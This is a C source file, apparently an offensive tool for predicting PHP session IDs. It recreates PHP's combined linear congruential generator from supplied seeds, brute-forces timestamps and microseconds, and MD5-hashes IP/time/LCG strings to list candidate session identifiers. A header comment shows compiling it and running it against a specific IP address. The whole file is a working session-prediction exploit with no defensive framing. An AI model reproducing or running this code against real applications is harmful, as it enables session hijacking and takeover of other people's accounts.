// gcc -lcrypto s1s2-session.c -o s1s2-session
// time ./s1s2-session 72.37.252.206 -1251994939 15654 1251248690 8

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <math.h>
#include <sys/time.h>
#include <openssl/md5.h>

/*
 * combinedLCG() returns a pseudo random number in the range of (0, 1).
 * The function combines two CGs with periods of
 * 2^31 - 85 and 2^31 - 249. The period of this function
 * is equal to the product of both primes.
 */
int q, z, s1, s2;
#define MODMULT(a, b, c, m, s) q = s/a;s=b*(s-a*q)-c*q;if(s<0)s+=m
double combined_lcg()
{
	z = s1 - s2;
	if (z < 1) {
		z += 2147483562;
	}

	return z * 4.656613e-10;
}

static char *pt(unsigned char *md)
{
	int i;
	static char buf[80];

	for (i = 0; i < MD5_DIGEST_LENGTH; i++)
		sprintf(&(buf[i*2]), "%02x", md[i]);

	return(buf);
}


static char hexconvtab[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,-";
static char *bin_to_readable(char *in, size_t inlen, char *out, char nbits)
{
	unsigned char *p, *q;
	unsigned short w;
	int mask;
	int have;

	p = (unsigned char *) in;
	q = (unsigned char *)in + inlen;

	w = 0;
	have = 0;
	mask = (1 << nbits) - 1;

	while (1) {
		if (have < nbits) {
			if (p < q) {
				w |= *p++ << have;
				have += 8;
			} else {
				/* consumed everything? */
				if (have == 0) break;
				/* No? We need a final round */
				have = nbits;
			}
		}

		/* consume nbits */
		*out++ = hexconvtab[w & mask];
		w >>= nbits;
		have -= nbits;
	}

	*out = '\0';
	return out;
}

int main(int argc, char** argv)
{	
	//unsigned char md[MD5_DIGEST_LENGTH];
	char buf[512];
	unsigned char *md = malloc(18);
	char *p = malloc(34);

	if (argc != 8)
	{
		fprintf(stderr, "usage: %s <ip> <s1> <s2> <session start time> <start at round #> <rounds to test> <bits per session byte [4|5|6]>\n", argv[0]);
		return -1;
	}

	double stime = strtod(argv[4], NULL);
	int start_round = atoi(argv[5]);
	int rounds = atoi(argv[6]);
	int bits = atoi(argv[7]);
	int i, j, usec;
	int first_stime = 0;
	double lcg[rounds+1]; // store our LCG for speed

	s1 = atoi(argv[2]);
	s2 = atoi(argv[3]);

	/* never start at round 0, doesn't make sense */
	if (start_round == 0)
		start_round = 1;

	/* first permute s1 and s2 our given # of rounds */
	for (i = 0; i < start_round; i++)
	{
		MODMULT(53668, 40014, 12211, 2147483563L, s1);
		MODMULT(52774, 40692, 3791,  2147483399L, s2);
	}

	/* brute force seconds */
	do
	{
		/* brute force X rounds on s1+s2 */
		for (i = 0; i < rounds; i++)
		{
			fprintf(stderr, "Running round %d, time %ld\n", i + start_round, (long int)stime);
			/* store our lcg for re-use */
			if (first_stime == 0)
			{
				lcg[i] = combined_lcg() * 10;

				/* next round so modmult */
				MODMULT(53668, 40014, 12211, 2147483563L, s1);
				MODMULT(52774, 40692, 3791,  2147483399L, s2);
			}
	
			/* brute force usec */
			for (usec = 0; usec < 1000000; usec++)
			{
				sprintf(buf, "%.15s%ld%ld%0.8F", argv[1], (long int)stime, (long int)usec, lcg[i]);
				MD5((unsigned char *)buf, strlen(buf), md);
				bin_to_readable((char *)md, MD5_DIGEST_LENGTH, p, bits);
				//p = pt(md);
				printf("%s %s\n", p, buf);
			}
		}

		// so we don't re-modmult
		first_stime++;
	} while (stime++);

	return 0;
}
